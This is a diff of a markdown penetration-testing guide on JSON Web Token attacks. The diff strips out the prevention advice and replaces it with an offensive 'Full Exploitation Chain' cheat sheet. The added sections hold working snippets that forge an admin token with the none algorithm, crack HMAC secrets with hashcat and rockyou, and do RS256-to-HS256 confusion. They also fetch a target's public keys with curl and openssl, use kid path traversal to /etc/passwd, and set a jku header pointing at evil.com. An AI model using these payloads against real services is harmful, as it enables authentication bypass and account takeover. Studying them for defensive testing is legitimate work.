@@ -1,118 +1,65 @@
-# JWT Attacks
+# JWT Attacks: Full Exploitation Chain
 
-JSON Web Tokens (JWT) are widely used for authentication and session management. Implementation flaws can lead to complete account takeover.
-
-## JWT Structure
-
-```
-header.payload.signature
-eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.dQw4w9WgXcQ
-```
-
-### Header
-```json
-{"alg": "HS256", "typ": "JWT"}
-```
-
-### Payload
-```json
-{"sub": "user123", "role": "user", "iat": 1516239022, "exp": 1516242622}
-```
-
-## Common Attacks
-
-### Algorithm Confusion
-Change the algorithm to bypass signature verification.
-
-```python
-# Change RS256 (asymmetric) to HS256 (symmetric)
-# If the server uses the public key as the HMAC secret...
-# Original: {"alg":"RS256"}
-# Modified: {"alg":"HS256"}
-```
-
-### None Algorithm
-```python
-# Some JWT libraries accept "none" algorithm
-# Modified header: {"alg":"none"}
-# Remove signature entirely
-token = base64(header) + "." + base64(payload) + "."
-```
-
-### Weak HMAC Secret
+## Decode & Analyze
 ```bash
-# Crack JWT with hashcat
-hashcat -m 16500 jwt.txt wordlist.txt
-
-# Use john
-python3 jwt_tool.py jwt.txt -C -d wordlist.txt
+# Decode header + payload (no verification)
+echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.xxx' | cut -d. -f1-2 | base64 -d
+# Or use jwt.io or jwt_tool
 ```
 
-### JWK Injection
-Some servers accept embedded JWK (JSON Web Key) in the header.
+## None Algorithm Attack
+```python
+import jwt
+token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
+```
+Condition: Server does not enforce algorithm validation.
 
+## Weak HMAC Secret
+```bash
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+python3 jwt_tool.py token -C -d common_secrets.txt
+```
+Common weak secrets: secret, password, key, changeme, 123456, admin, jwt_secret
+
+## Algorithm Confusion (RS256 -> HS256)
+```python
+# Use PUBLIC key as HMAC secret
+pubkey = """-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...
+-----END PUBLIC KEY-----"""
+token = jwt.encode({"user": "admin"}, key=pubkey, algorithm="HS256")
+```
+Condition: Server accepts HS256 but expects RS256.
+
+### Finding Public Key
+```bash
+curl https://target.com/.well-known/jwks.json
+curl https://target.com/api/jwks
+openssl s_client -connect target.com:443 </dev/null | openssl x509 -pubkey -noout
+```
+
+## kid Injection (Path Traversal)
 ```json
-{
-  "alg": "RS256",
-  "jwk": {
-    "kty": "RSA",
-    "n": "YOUR_PUBLIC_MODULUS",
-    "e": "AQAB"
-  }
-}
+{"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"}
 ```
+Key is empty file -> sign with empty key.
+Other variants: `../../../etc/passwd` (file read via error), SQLi in key lookup.
 
-If the server trusts the embedded key, you can sign tokens with a key you control.
-
-### Kid Injection
-The `kid` (Key ID) header is used to look up the verification key.
-
+## jku/x5u Header Manipulation
 ```json
-{
-  "alg": "HS256",
-  "kid": "../../etc/passwd"    # Path traversal to use file as key
-}
+{"alg": "RS256", "jku": "https://evil.com/jwks.json", "kid": "evil-key"}
 ```
+Host attacker-controlled JWKS on evil.com.
 
-Or use SQL injection in kid to retrieve a known value.
-
-### Claims Manipulation
+## JWK Embedded Attack
 ```json
-// Original
-{"sub": "user", "role": "user", "iat": 1516239022}
-
-// Modified
-{"sub": "admin", "role": "admin", "iat": 1516239022}
+{"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "AQAB", "d": "..."}}
 ```
+Some libraries trust embedded JWK without verifying provenance.
 
-### Token Expiration Bypass
-- Set `exp` to far-future date
-- Remove `exp` claim entirely
-- Set `nbf` (not before) to past date
-
-### Cross-Service Relay
-Token issued for service A is valid for service B due to missing audience verification.
-
-## Tools
-
-| Tool | Purpose |
-|------|---------|
-| **jwt_tool** | Comprehensive JWT attack toolkit |
-| **jwt-cracker** | HMAC secret brute-force |
-| **jwt.io** | Debugger and decoder |
-| **Burp JWT Editor** | Modify JWTs in Burp Suite |
-| **hashcat** | JWT hash cracking (mode 16500) |
-
-## Prevention
-
-1. **Restrict algorithms** — Never accept "none" algorithm
-2. **Validate algorithm** — Compare expected vs received algorithm
-3. **Use asymmetric keys** — RS256/ES256 with secure key storage
-4. **Validate all claims** — `sub`, `exp`, `nbf`, `aud`, `iss`
-5. **Short expiration** — 15-60 minutes, use refresh tokens
-6. **Don't store secrets in JWTs**
-7. **Use JWT libraries** — Don't implement your own
-
----
-
-> **Next Section**: [Reporting](../06-Reporting/01-report-writing.md)
+## Defense Circumvention
+When server validates JWT properly, look for:
+- JWT in URL query strings (logging leak)
+- JWT in WebSocket messages
+- JWT in POST body (non-standard)
+- JWT not expiring on logout
